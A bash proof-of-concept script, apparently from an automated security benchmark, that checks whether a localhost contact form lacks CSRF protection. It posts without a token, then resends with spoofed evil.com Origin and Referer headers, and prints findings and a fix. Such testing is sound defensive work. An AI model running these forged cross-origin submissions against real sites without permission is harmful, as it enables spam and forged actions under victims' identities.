#!/bin/bash
# POC: Bash script to test CSRF protection by attempting to submit the contact form without tokens and from malicious origins
# Target: .
# Created: 2025-11-07T19:08:01.016Z
# Session: benchmark-XBEN-061-24-mhp7rqjn

# CSRF Protection Test - Contact Form
# Tests if the contact form accepts POST requests without CSRF tokens

TARGET="http://localhost:3000/contact.php"
echo "=========================================="
echo "CSRF Protection Test - Contact Form"
echo "=========================================="
echo "Target: $TARGET"
echo ""

# Test 1: Submit form without any token
echo "[TEST 1] Submitting form without CSRF token..."
echo "-------------------------------------------"

RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=CSRFTest&email=csrf@test.com&message=This+is+a+CSRF+test+message+submitted+without+token" \
  2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE:")

echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body:"
echo "$BODY"
echo ""

# Check if submission was successful
if echo "$BODY" | grep -qi "thank you\|success\|submitted\|received"; then
    echo "✅ VULNERABLE: Form accepted submission without CSRF token!"
    echo ""
    
    # Test 2: Submit from different origin (simulating CSRF attack)
    echo "[TEST 2] Submitting from attacker origin (evil.com)..."
    echo "--------------------------------------------------------"
    
    RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Origin: http://evil.com" \
      -H "Referer: http://evil.com/attack.html" \
      -d "name=AttackerCSRF&email=attacker@evil.com&message=CSRF+attack+from+malicious+origin" \
      2>&1)
    
    HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
    BODY2=$(echo "$RESPONSE2" | grep -v "HTTP_CODE:")
    
    echo "HTTP Status Code: $HTTP_CODE2"
    echo "Response Body:"
    echo "$BODY2"
    echo ""
    
    if echo "$BODY2" | grep -qi "thank you\|success\|submitted\|received"; then
        echo "✅ CRITICALLY VULNERABLE: Form accepts submissions from malicious origins!"
        echo ""
        echo "FINDINGS:"
        echo "---------"
        echo "1. No CSRF token validation present"
        echo "2. No Origin header validation"
        echo "3. No Referer header validation"
        echo "4. Application accepts cross-origin form submissions"
        echo ""
        echo "IMPACT:"
        echo "-------"
        echo "An attacker can create a malicious webpage that automatically"
        echo "submits the contact form when visited by a victim. This enables:"
        echo "  - Spam submission attacks"
        echo "  - DoS through form flooding"
        echo "  - Submission of malicious content under victim's identity"
        echo ""
        echo "RECOMMENDATION:"
        echo "--------------"
        echo "Implement CSRF token validation using synchronizer token pattern."
        
        exit 0
    else
        echo "⚠️  Form rejected malicious origin (partial protection)"
        exit 0
    fi
    
elif [ "$HTTP_CODE" = "403" ] || [ "$HTTP_CODE" = "401" ]; then
    echo "❌ NOT VULNERABLE: Server rejected request (HTTP $HTTP_CODE)"
    echo "CSRF protection appears to be in place."
    exit 1
else
    echo "⚠️  Unexpected response (HTTP $HTTP_CODE)"
    echo "Manual verification required."
    exit 1
fi